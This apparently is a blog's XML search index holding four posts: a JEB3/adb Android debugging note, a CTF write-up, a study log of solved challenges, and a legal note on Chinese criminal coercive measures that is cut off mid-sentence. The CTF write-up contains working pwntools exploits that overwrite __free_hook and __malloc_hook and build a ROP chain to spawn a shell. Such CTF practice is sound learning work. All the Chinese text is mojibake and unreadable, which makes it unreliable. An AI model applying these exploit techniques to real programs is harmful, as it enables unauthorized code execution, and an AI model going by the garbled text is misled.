<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JEB3 åŠ¨æ€è°ƒè¯•</title>
      <link href="/2020/03/02/JEB3-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
      <url>/2020/03/02/JEB3-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="å‡†å¤‡">å‡†å¤‡<a class="post-anchor" href="#å‡†å¤‡"></a></h1><p>jdk1.8.0_221.jdk</p><p>JEB3</p><p>ç½‘æ˜“mumuæ¨¡æ‹Ÿå™¨</p><p>adb</p><h1 id="é…ç½®">é…ç½®<a class="post-anchor" href="#é…ç½®"></a></h1><p>é¦–å…ˆå¯åŠ¨ç½‘æ˜“mumuæµè§ˆå™¨</p><ol><li><p>command + ï¼Œæ‰“å¼€rootæƒé™</p></li><li><p>ç³»ç»Ÿè®¾ç½®æ‰“å¼€ USB è°ƒè¯•</p></li></ol><p>adb</p><ol><li><code>adb kill-server</code></li><li><code>adb server</code></li><li><code>adb shell pm list package -3</code> æŸ¥çœ‹å®‰è£…è½¯ä»¶</li></ol><p><a href="assets/JEB3-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/00831rSTly1gcfvhn1gauj30jm070whc.jpg" data-caption data-fancybox="images"><img src="assets/JEB3-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/00831rSTly1gcfvhn1gauj30jm070whc.jpg" alt></a></p><ol start="4"><li><code>adb shell start am start -D -n com.a.easyjava/.MainActivity</code> å¯ä»¥å» JEB æŸ¥çœ‹ <code>&lt;activity android:name=&quot;com.a.easyjava.MainActivity&quot;&gt;</code></li><li>è¿™æ˜¯ æ¨¡æ‹Ÿå™¨å°±ä¼šå¼€å¯ apk ç­‰å¾…debug</li></ol><p>JEB</p><ol><li><code>command + b</code> ä¸‹æ–­ç‚¹</li><li>ç‚¹å‡»è°ƒè¯•å™¨å¼€å§‹</li></ol><p><a href="assets/JEB3-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20200302205326519.png" data-caption="image-20200302205326519" data-fancybox="images"><img src="assets/JEB3-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/image-20200302205326519.png" alt="image-20200302205326519"></a></p><p>åŸºæœ¬ä¸Šåˆ°è¿™é‡Œå°±okäº†</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiuæ–°æ˜¥æˆ˜å½¹èµ›</title>
      <link href="/2020/02/22/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E8%B5%9B/"/>
      <url>/2020/02/22/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="Document">Document<a class="post-anchor" href="#Document"></a></h1><p>æŒ‡é’ˆæœªæ¸…é›¶</p><ol><li>é¦–å…ˆåˆ©ç”¨ unsortedbin leak libc</li><li>å†æ¬¡ add æ—¶ï¼Œä¼šä» unsortedbin åˆ‡å‰² 0x20ï¼Œå¯ä»¥leakå‡º heap çš„åœ°å€</li><li>ç»§ç»­ add å¯ä»¥ä¿®æ”¹ chunk(0x20) é‡Œçš„æŒ‡é’ˆäº†ï¼Œä»è€Œè¾¾åˆ°ä»»æ„åœ°å€å†™ï¼Œä¿®æ”¹ä¸º free_hook ä¸º systemï¼Œç„¶åä¿®æ”¹ä¸€ä¸ª heap ptr ä¸ºè‡ªå·±å¡«å…¥çš„ /bin/sh åœ°å€</li></ol><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment"># from LibcSearcher import *</span>file_name = <span class="hljs-string">'./pwn'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>context.arch = <span class="hljs-string">'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)<span class="hljs-comment">#p = remote(ip,port)</span>arena_offset = <span class="hljs-number">0x3c4b20</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name,sex,information)</span>:</span>p.recvuntil(<span class="hljs-string">'Give me your choice :'</span>)p.sendline(<span class="hljs-string">'1'</span>)p.recvuntil(<span class="hljs-string">'input name\n'</span>)p.send(str(name))p.recvuntil(<span class="hljs-string">'input sex\n'</span>)p.send(str(sex))p.recvuntil(<span class="hljs-string">'input information\n'</span>)p.send(str(information))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span>p.recvuntil(<span class="hljs-string">'Give me your choice :'</span>)p.sendline(<span class="hljs-string">'4'</span>)p.recvuntil(<span class="hljs-string">'Give me your index :'</span>)p.sendline(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>p.recvuntil(<span class="hljs-string">'Give me your choice :'</span>)p.sendline(<span class="hljs-string">'2'</span>)p.recvuntil(<span class="hljs-string">'Give me your index :'</span>)p.send(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,want,information)</span>:</span>p.recvuntil(<span class="hljs-string">'Give me your choice :'</span>)p.sendline(<span class="hljs-string">'3'</span>)p.recvuntil(<span class="hljs-string">'Give me your index :'</span>)p.send(str(index))p.recvuntil(<span class="hljs-string">'Are you sure change sex?\n'</span>)p.send(str(want))p.recvuntil(<span class="hljs-string">'Now change information\n'</span>)p.send(str(information))add(<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>,<span class="hljs-string">'W'</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">0x70</span>)<span class="hljs-comment">#0</span>add(<span class="hljs-string">"b"</span>*<span class="hljs-number">8</span>,<span class="hljs-string">'W'</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">0x70</span>)<span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)p.recvline()libc_base = u64(p.recv(<span class="hljs-number">6</span>).strip(<span class="hljs-string">'\n'</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">88</span> - arena_offsetarena = libc_base + arena_offset +<span class="hljs-number">88</span>free_hook = libc_base + libc.symbols[<span class="hljs-string">'__free_hook'</span>]log.success(<span class="hljs-string">"free_hook: "</span>+hex(free_hook))log.success(<span class="hljs-string">"libc_base: "</span>+hex(libc_base))one_gadget = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]log.success(<span class="hljs-string">"system: "</span>+hex(one_gadget))add(<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>,<span class="hljs-string">'W'</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">0x70</span>)<span class="hljs-comment">#2</span>add(<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>,<span class="hljs-string">'W'</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">0x70</span>)<span class="hljs-comment">#3</span>add(<span class="hljs-string">"b"</span>*<span class="hljs-number">8</span>,<span class="hljs-string">'W'</span>,(<span class="hljs-string">"/bin/sh\x00"</span>).ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">"\x00"</span>))show(<span class="hljs-number">0</span>)heap = u64(p.recvuntil(<span class="hljs-string">"\x55"</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))sh = (heap&gt;&gt;<span class="hljs-number">12</span>&lt;&lt;<span class="hljs-number">12</span>^<span class="hljs-number">0x2a0</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-string">'Y'</span>,(p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(free_hook<span class="hljs-number">-0x10</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(sh)+p64(<span class="hljs-number">31</span>)).ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">"\x00"</span>))edit(<span class="hljs-number">3</span>,<span class="hljs-string">'N'</span>,(p64(one_gadget)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span>+p64(<span class="hljs-number">0x80</span>)).ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">"\x00"</span>))free(<span class="hljs-number">4</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h1 id="Some-thing-exceting">Some_thing_exceting<a class="post-anchor" href="#Some-thing-exceting"></a></h1><pre><code class="hljs python">malloc(<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#0</span>malloc(<span class="hljs-number">0x60</span>,<span class="hljs-string">"b"</span>*<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">"b"</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#1</span>malloc(<span class="hljs-number">0x70</span>,<span class="hljs-string">"/bin/sh\x00"</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">"/bin/sh\x00"</span>)<span class="hljs-comment">#2</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)malloc(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0x00000000006020A8</span>)+p8(<span class="hljs-number">0xe0</span>),<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#3</span>show(<span class="hljs-number">0</span>)</code></pre><p>get shell</p><pre><code class="hljs python">malloc(<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#0</span>malloc(<span class="hljs-number">0x60</span>,<span class="hljs-string">"b"</span>*<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">"b"</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#1</span>malloc(<span class="hljs-number">0x70</span>,<span class="hljs-string">"/bin/sh\x00"</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">"/bin/sh\x00"</span>)<span class="hljs-comment">#2</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)malloc(<span class="hljs-number">0x10</span>,p64(elf.got[<span class="hljs-string">'puts'</span>])+p8(<span class="hljs-number">0xe0</span>),<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#3</span>show(<span class="hljs-number">0</span>)p.recvuntil(<span class="hljs-string">"# Banana's ba is"</span>)libc.address=u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))-libc.sym[<span class="hljs-string">'puts'</span>]free(<span class="hljs-number">3</span>)malloc(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0xe0</span>),<span class="hljs-number">0x60</span>,<span class="hljs-string">"d"</span>*<span class="hljs-number">8</span>)free(<span class="hljs-number">0</span>)malloc(<span class="hljs-number">0x60</span>,p64(libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<span class="hljs-number">-0x23</span>),<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>)malloc(<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'a'</span>*(<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>)+p64(libc.address+<span class="hljs-number">0x4526a</span>)+p64(libc.sym[<span class="hljs-string">'__libc_realloc'</span>]+<span class="hljs-number">16</span>))ls(<span class="hljs-string">"malloc addr"</span>,libc.sym[<span class="hljs-string">'__free_hook'</span>])<span class="hljs-comment"># ls("libc addr",libc.address)</span>p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"1"</span>)<span class="hljs-comment"># gdb.attach(p)</span><span class="hljs-comment"># p.sendline("cat flag &gt;&amp;0")</span>p.interactive()</code></pre><h1 id="borrowstack">borrowstack<a class="post-anchor" href="#borrowstack"></a></h1><pre><code class="hljs python">bank = <span class="hljs-number">0x0000000000601080</span>rdi_ret = <span class="hljs-number">0x0000000000400703</span>leave_ret = <span class="hljs-number">0x0000000000400699</span>p.recvuntil(<span class="hljs-string">"want\n"</span>)p.send(<span class="hljs-string">"a"</span>*<span class="hljs-number">0x60</span>+p64(bank+<span class="hljs-number">0x60</span>)+p64(leave_ret))gdb.attach(p,<span class="hljs-string">"b *0x00000000040067B"</span>)stop()p.recvuntil(<span class="hljs-string">"!\n"</span>)p.send(<span class="hljs-string">"a"</span>*<span class="hljs-number">0x60</span>+p64(elf.got[<span class="hljs-string">'puts'</span>]+<span class="hljs-number">0x60</span>)+p64(rdi_ret)+p64(elf.got[<span class="hljs-string">"read"</span>])+p64(elf.plt[<span class="hljs-string">'puts'</span>])+p64(<span class="hljs-number">0x400660</span>))libc.address=u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))-libc.sym[<span class="hljs-string">'read'</span>]one_gadget=libc.address+<span class="hljs-number">0xf02a4</span>sleep(<span class="hljs-number">0.2</span>)payload=p64(one_gadget)p.send(payload)</code></pre><ol><li>got è¡¨<code>0x601000-0x601030</code>ä¸bss<code>0x601080</code>è¿ç§»ä¹‹åå‡½æ•°è°ƒç”¨ä¼šè®©æ ˆå¢é«˜ï¼Œè¡¨ç°å‡ºæ¥çš„å°±æ˜¯bssçš„ä½åœ°å€ä¼šè¢«æ‹¿æ¥æ”¾ä¸€äº›æ•°æ®ï¼Œæ‰€ä»¥read_gotå°±è¢«æ”¹äº†</li><li>é¦–å…ˆåˆ©ç”¨ leave_ret ä¿®æ”¹ rsp ä¸º bank+0x60 ï¼Œç„¶åå°† rbp-0x60(å³bufçš„è¯»å…¥åœ°å€)å†™å…¥ puts çš„ got åœ°å€</li><li>è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯è¿”å› main å‡½æ•°çš„æ—¶å€™ï¼Œmainå‡½æ•°å¼€å¤´ <code>sub     rsp, 60h</code> è¿˜ä¼šå†æ¬¡è¸©æ‰æ•°æ®</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My winter vacation</title>
      <link href="/2020/01/12/My-winter-vacation/"/>
      <url>/2020/01/12/My-winter-vacation/</url>
      
        <content type="html"><![CDATA[<h1 id="1æœˆ12æ—¥-å‘¨æ—¥-19-43">1æœˆ12æ—¥ å‘¨æ—¥ 19:43<a class="post-anchor" href="#1æœˆ12æ—¥-å‘¨æ—¥-19-43"></a></h1><p>å¤§çº¦ä¸‹åˆ4ç‚¹å›åˆ°å®¶ä¹‹åï¼Œä¸€ç›´åˆ°ç°åœ¨æ‰æœ‰æœºä¼šæ‰“å¼€ç”µè„‘ã€‚</p><p>åšå®¢è¿˜æ˜¯ç…§å¸¸æ›´æ–°å§ï¼Œè¿™é‡Œè´Ÿè´£è®°å½•ä¸€ä¸‹æ¯å¤©å­¦çš„å“ªäº›ä¸œè¥¿ã€‚</p><p>è®°å½•ä¸‹è¿›åº¦ï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªç£ä¿ƒã€‚å†ç©ä¸€ä¸ªå­¦æœŸCTFå‡†å¤‡å»å­¦ç”³è®ºè¡Œæµ‹äº†ã€‚</p><p>ä¸”è¡Œä¸”çæƒœ ğŸ‘¿</p><p>Reverse (9/100)</p><h1 id="1æœˆ13æ—¥-å‘¨ä¸€-10-26">1æœˆ13æ—¥ å‘¨ä¸€ 10:26<a class="post-anchor" href="#1æœˆ13æ—¥-å‘¨ä¸€-10-26"></a></h1><p>reverse(16/100)</p><h2 id="SimpleREV">SimpleREV<a class="post-anchor" href="#SimpleREV"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):<span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-string">'@'</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-string">'Z'</span>:tmp = key[:i]+chr(ord(key[i])+<span class="hljs-number">32</span>)+key[i+<span class="hljs-number">1</span>:]key = tmp<span class="hljs-keyword">print</span> key<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):guess = (ord(enc[i])<span class="hljs-number">-97</span>*<span class="hljs-number">2</span>+<span class="hljs-number">39</span>+ord(key[i]))<span class="hljs-keyword">if</span> (guess&gt;=<span class="hljs-number">97</span> <span class="hljs-keyword">and</span> guess&lt;=<span class="hljs-number">122</span>) <span class="hljs-keyword">or</span> (guess&gt;=<span class="hljs-number">65</span> <span class="hljs-keyword">and</span> guess&lt;=<span class="hljs-number">90</span>):flag += chr(guess)<span class="hljs-keyword">continue</span><span class="hljs-keyword">if</span> ((guess+<span class="hljs-number">26</span>)&gt;=<span class="hljs-number">97</span> <span class="hljs-keyword">and</span> (guess+<span class="hljs-number">26</span>)&lt;=<span class="hljs-number">122</span>) <span class="hljs-keyword">or</span> ((guess+<span class="hljs-number">26</span>)&gt;=<span class="hljs-number">65</span> <span class="hljs-keyword">and</span> (guess+<span class="hljs-number">26</span>)&lt;=<span class="hljs-number">90</span>):flag += chr(guess+<span class="hljs-number">26</span>)<span class="hljs-keyword">continue</span><span class="hljs-keyword">if</span> ((guess+<span class="hljs-number">2</span>*<span class="hljs-number">26</span>)&gt;=<span class="hljs-number">97</span> <span class="hljs-keyword">and</span> (guess+<span class="hljs-number">2</span>*<span class="hljs-number">26</span>)&lt;=<span class="hljs-number">122</span>) <span class="hljs-keyword">or</span> ((guess+<span class="hljs-number">2</span>*<span class="hljs-number">26</span>)&gt;=<span class="hljs-number">65</span> <span class="hljs-keyword">and</span> (guess+<span class="hljs-number">2</span>*<span class="hljs-number">26</span>)&lt;=<span class="hljs-number">90</span>):flag += chr(guess+<span class="hljs-number">2</span>*<span class="hljs-number">26</span>)<span class="hljs-keyword">continue</span><span class="hljs-keyword">print</span> flag</code></pre><h1 id="1æœˆ14æ—¥-å‘¨äºŒ-17-51">1æœˆ14æ—¥ å‘¨äºŒ 17:51<a class="post-anchor" href="#1æœˆ14æ—¥-å‘¨äºŒ-17-51"></a></h1><h2 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h2><p>[OGeek2019]babyrop</p><p>get_started_3dsctf_2016</p><p>babyheap_0ctf_2017</p><p>pwn(12/100)</p><h1 id="1æœˆ17æ—¥-å‘¨äº”">1æœˆ17æ—¥ å‘¨äº”<a class="post-anchor" href="#1æœˆ17æ—¥-å‘¨äº”"></a></h1><p>æ•´ç†ç”µå­æ•°æ®å–è¯ linux æ¶æ„ä»£ç åˆ†æ</p><h1 id="1æœˆ18æ—¥-å‘¨å…­">1æœˆ18æ—¥ å‘¨å…­<a class="post-anchor" href="#1æœˆ18æ—¥-å‘¨å…­"></a></h1><p>åšäº†äº›å¯†ç </p><h1 id="1æœˆ19æ—¥-å‘¨æ—¥">1æœˆ19æ—¥ å‘¨æ—¥<a class="post-anchor" href="#1æœˆ19æ—¥-å‘¨æ—¥"></a></h1><p>pwn(17/100)</p><p>reverse(20/100)</p><h1 id="1æœˆ20æ—¥-å‘¨ä¸€">1æœˆ20æ—¥ å‘¨ä¸€<a class="post-anchor" href="#1æœˆ20æ—¥-å‘¨ä¸€"></a></h1><p>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</p><p>not_the_same_3dsctf_2016</p><p>babyfengshui_33c3_2016</p><h1 id="1æœˆ27æ—¥-å‘¨ä¸€">1æœˆ27æ—¥ å‘¨ä¸€<a class="post-anchor" href="#1æœˆ27æ—¥-å‘¨ä¸€"></a></h1><p>[HarekazeCTF2019]baby_rop</p><p>[HarekazeCTF2019]baby_rop2</p><h1 id="1æœˆ31æ—¥-å‘¨äº”">1æœˆ31æ—¥ å‘¨äº”<a class="post-anchor" href="#1æœˆ31æ—¥-å‘¨äº”"></a></h1><p>pwn2_sctf_2016</p><h1 id="2æœˆ1æ—¥-å‘¨å…­">2æœˆ1æ—¥ å‘¨å…­<a class="post-anchor" href="#2æœˆ1æ—¥-å‘¨å…­"></a></h1><p>jarvisoj_level0</p><p>ciscn_2019_ne_5</p><p>jarvisoj_level2</p><p>ciscn_2019_n_5</p><h1 id="2æœˆ2æ—¥-å‘¨æ—¥">2æœˆ2æ—¥ å‘¨æ—¥<a class="post-anchor" href="#2æœˆ2æ—¥-å‘¨æ—¥"></a></h1><p>ciscn_2019_final_3</p><p>ciscn_2019_es_2</p><h1 id="2æœˆ3æ—¥-å‘¨ä¸€">2æœˆ3æ—¥ å‘¨ä¸€<a class="post-anchor" href="#2æœˆ3æ—¥-å‘¨ä¸€"></a></h1><p>roarctf_2019_easy_pwn</p><p>jarvisoj_level2_x64</p><h1 id="2æœˆ4æ—¥-å‘¨äºŒ">2æœˆ4æ—¥ å‘¨äºŒ<a class="post-anchor" href="#2æœˆ4æ—¥-å‘¨äºŒ"></a></h1><p>roarctf_2019_easy_pwn</p><p>jarvisoj_level3_x64</p><h1 id="2æœˆ5æ—¥-å‘¨ä¸‰">2æœˆ5æ—¥ å‘¨ä¸‰<a class="post-anchor" href="#2æœˆ5æ—¥-å‘¨ä¸‰"></a></h1><p>[Black Watch å…¥ç¾¤é¢˜]PWN</p><h1 id="2æœˆ6æ—¥-å‘¨å››">2æœˆ6æ—¥ å‘¨å››<a class="post-anchor" href="#2æœˆ6æ—¥-å‘¨å››"></a></h1><p>jarvisoj_tell_me_something</p><p>jarvisoj_level3</p><p>jarvisoj_level4</p><p>jarvisoj_fm</p><p>[ZJCTF 2019]Login</p><p>others_shellcode</p><p>bjdctf_2020_babystack</p><p>ciscn_2019_final_2</p><h1 id="2æœˆ7æ—¥-å‘¨äº”">2æœˆ7æ—¥ å‘¨äº”<a class="post-anchor" href="#2æœˆ7æ—¥-å‘¨äº”"></a></h1><p>jarvisoj_level1</p><p>hitcontraining_uaf</p><h1 id="2æœˆ8æ—¥-å‘¨å…­">2æœˆ8æ—¥ å‘¨å…­<a class="post-anchor" href="#2æœˆ8æ—¥-å‘¨å…­"></a></h1><p>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</p><p>jarvisoj_test_your_memory</p><p>bjdctf_2020_babyrop</p><p>å¼ºç½‘æ¯2019 æ‹Ÿæ€ STKOF</p><h1 id="2æœˆ9æ—¥-å‘¨æ—¥">2æœˆ9æ—¥ å‘¨æ—¥<a class="post-anchor" href="#2æœˆ9æ—¥-å‘¨æ—¥"></a></h1><p>ciscn_2019_es_1</p><h1 id="2æœˆ10æ—¥-å‘¨ä¸€">2æœˆ10æ—¥ å‘¨ä¸€<a class="post-anchor" href="#2æœˆ10æ—¥-å‘¨ä¸€"></a></h1><p>ciscn_2019_es_7</p>]]></content>
      
      
      
        <tags>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ‘äº‹å¼ºåˆ¶æªæ–½æœ‰å…³è§„å®š</title>
      <link href="/2020/01/04/%E5%88%91%E4%BA%8B%E5%BC%BA%E5%88%B6%E6%8E%AA%E6%96%BD%E6%9C%89%E5%85%B3%E8%A7%84%E5%AE%9A/"/>
      <url>/2020/01/04/%E5%88%91%E4%BA%8B%E5%BC%BA%E5%88%B6%E6%8E%AA%E6%96%BD%E6%9C%89%E5%85%B3%E8%A7%84%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ‘äº‹å¼ºåˆ¶æªæ–½">åˆ‘äº‹å¼ºåˆ¶æªæ–½<a class="post-anchor" href="#åˆ‘äº‹å¼ºåˆ¶æªæ–½"></a></h1><p>å¼ºåˆ¶æªæ–½æ˜¯æŒ‡ä¸ºä¿éšœåˆ‘äº‹è¯‰è®¼æ´»åŠ¨çš„é¡ºåˆ©è¿›è¡Œï¼Œä¾æ³•å¯¹çŠ¯ç½ªå«Œç–‘äººã€è¢«å‘Šäººæ‰€é‡‡å–çš„æš‚æ—¶é™åˆ¶æˆ–è€…å‰¥å¤ºå…¶äººèº«è‡ªç”±çš„å„ç§æ–¹æ³•å’Œæ‰‹æ®µçš„æ€»ç§°ã€‚ç›®çš„ï¼šä¸ºä¿éšœåˆ‘äº‹è¯‰è®¼æ´»åŠ¨çš„é¡ºåˆ©è¿›è¡Œï¼Œ<strong>æ˜¯ä¿éšœæ€§æªæ–½</strong>ï¼Œä¸æ˜¯æƒ©ç½šæ€§æªæ–½ã€‚</p><p>ã€Šåˆ‘è¯‰æ³•ã€‹å¯¹æœªæˆå¹´çŠ¯ç½ªå«Œç–‘äººã€è¢«å‘Šäººåº”å½“ä¸¥æ ¼é™åˆ¶é€‚ç”¨é€®æ•ã€‚</p><h2 id="æ‹˜ä¼ ">æ‹˜ä¼ <a class="post-anchor" href="#æ‹˜ä¼ "></a></h2><ol><li>ã€Šåˆ‘è¯‰æ³•ã€‹ç¬¬äº”åæ¡è§„å®šï¼šäººæ°‘æ³•é™¢ã€äººæ°‘æ£€å¯Ÿé™¢ã€å…¬å®‰æœºå…³æ ¹æ®æ¡ˆä»¶æƒ…å†µï¼Œå¯¹çŠ¯ç½ªå«Œç–‘äººã€è¢«å‘Šäººå¯ä»¥æ‹˜ä¼ ã€å–ä¿å€™å®¡æˆ–è€…ç›‘è§†å±…ä½ã€‚</li><li>ã€Šåˆ‘è¯‰æ³•ã€‹ç¬¬ä¹åäºŒæ¡è§„å®šï¼šå¯¹äºä¸éœ€è¦é€®æ•ã€æ‹˜ç•™çš„çŠ¯ç½ªå«Œç–‘äººï¼Œå¯ä»¥ä¼ å”¤åˆ°çŠ¯ç½ªå«Œç–‘äººæ‰€åœ¨å¸‚ã€å¿å†…çš„æŒ‡å®šåœ°ç‚¹æˆ–è€…åˆ°ä»–çš„ä½å¤„è¿›è¡Œè®¯é—®ï¼Œä½†æ˜¯åº”å½“å‡ºç¤ºäººæ°‘æ£€å¯Ÿé™¢æˆ–è€…å…¬å®‰æœºå…³çš„è¯æ˜æ–‡ä»¶ã€‚</li><li>ã€Šåˆ‘è¯‰æ³•ã€‹ç¬¬ä¸€ç™¾ä¸€åä¸ƒæ¡è§„å®šï¼šä¼ å”¤ã€æ‹˜ä¼ æŒç»­çš„æ—¶é—´ä¸å¾—è¶…è¿‡åäºŒå°æ—¶ï¼›æ¡ˆæƒ…ç‰¹åˆ«é‡å¤§ã€å¤æ‚ï¼Œéœ€è¦é‡‡å–æ‹˜ç•™ã€é€®æ•æªæ–½çš„ï¼Œä¼ å”¤ã€æ‹˜ä¼ æŒç»­çš„æ—¶é—´ä¸å¾—è¶…è¿‡äºŒåå››å°æ—¶ã€‚â€œä¸å¾—ä»¥è¿ç»­ä¼ å”¤ã€æ‹˜ä¼ çš„å½¢å¼å˜ç›¸æ‹˜ç¦çŠ¯ç½ªå«Œç–‘äººã€‚ä¼ å”¤ã€æ‹˜ä¼ çŠ¯ç½ªå«Œç–‘äººï¼Œåº”å½“ä¿è¯çŠ¯ç½ªå«Œç–‘äººçš„é¥®é£Ÿå’Œå¿…è¦çš„ä¼‘æ¯æ—¶é—´â€</li></ol><blockquote><p>ä¸€èˆ¬ä¸¤æ¬¡æ‹˜ä¼ çš„é—´éš”æ—¶é—´ä¸å°‘äº12ä¸ªå°æ—¶ã€‚</p></blockquote><blockquote><p>å…¬å®‰æœºå…³éœ€è¦æ‹˜ä¼ çŠ¯ç½ªå«Œç–‘äººæ—¶ï¼Œä¾¦æŸ¥äººå‘˜åº”å½“å¡«å†™ã€Šå‘ˆè¯·æ‹˜ä¼ æŠ¥å‘Šä¹¦ã€‹ï¼Œç»è¿‡å¿çº§ä»¥ä¸Šå…¬å®‰æœºå…³è´Ÿè´£äººæ‰¹å‡†åŒ»æŠ¤ï¼Œå¡«å†™ã€Šæ‹˜ä¼ è¯ã€‹æ‰èƒ½æ‰§è¡Œã€‚</p></blockquote><ul><li>æ‹˜ä¼ åº”å½“ç”±ä¸¤äººä»¥ä¸Šçš„æ‰§è¡Œäººå‘˜æ‰§è¡Œã€‚æ‹˜ä¼ æ—¶ï¼Œåº”å½“å‘è¢«æ‹˜ä¼ äººå‡ºç¤ºæ‹˜ä¼ è¯ï¼Œå¯¹æŠ—æ‹’æ‹˜ä¼ çš„ï¼Œå¯ä»¥ä½¿ç”¨æˆ’å…·ï¼Œå¼ºåˆ¶åˆ°æ¡ˆã€‚</li><li>æ‹˜ä¼ çš„åœ°ç‚¹ï¼Œåº”åœ¨çŠ¯ç½ªå«Œç–‘äººã€è¢«å‘Šäººæ‰€åœ¨çš„å¸‚ã€å¿ä»¥å†…ã€‚å¦‚æœçŠ¯ç½ªå«Œç–‘äººçš„å·¥ä½œå•ä½ã€æˆ·ç±åœ°ä¸å±…ä½åœ°ä¸åœ¨åŒä¸€å¸‚ã€å¿çš„ï¼Œæ‹˜ä¼ 